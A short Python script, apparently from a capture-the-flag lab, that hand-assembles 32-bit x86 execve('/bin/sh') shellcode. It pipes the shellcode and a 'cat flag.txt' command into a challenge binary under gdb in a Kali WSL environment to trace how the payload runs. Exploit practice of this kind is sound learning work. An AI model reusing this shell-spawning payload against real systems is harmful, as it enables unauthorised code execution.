import sys, subprocess
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
CWD = r"/tmp/cylab_eps"
ins = ["89e7"]
for ch in "//bin/sh":
    ins.append("b0%02x" % ord(ch))
    ins.append("aa90")
ins += ["31c0", "aa90", "89e3", "5090", "5390", "89e1", "b00b", "cd80"]
sc = b"".join(bytes.fromhex(i) for i in ins)
open(CWD + r"\in184.bin", "wb").write(sc + b"\ncat flag.txt\n")
gdb = """set pagination off
break *0x80492b0
run < in184.bin
printf "buf=%p\\n", $eax
x/60bx $eax
stepi 6
printf "--- apres quelques instructions ---\\n"
info registers eip edi eax esp
x/24bx $esp
quit
"""
open(CWD + r"\g184b.gdb", "w").write(gdb)
out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
                      "cd /tmp/cylab_eps && "
                      "gdb -nx -q -batch -x g184b.gdb ./184_fun 2>&1 | tail -24"],
                     capture_output=True, text=True).stdout
print(out)
